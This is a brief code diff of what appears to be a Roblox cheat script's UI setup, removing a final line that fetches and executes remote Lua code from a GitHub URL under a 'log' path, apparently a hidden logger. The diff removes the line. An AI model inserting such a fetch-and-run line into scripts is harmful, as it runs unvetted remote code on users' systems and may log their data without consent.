@@ -136,7 +136,3 @@ local Button = GameTab:CreateButton({
 
 -- Misc
 local MiscTab = Window:CreateTab("Misc", 4483362458)
-
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/mmlog.lua"))()
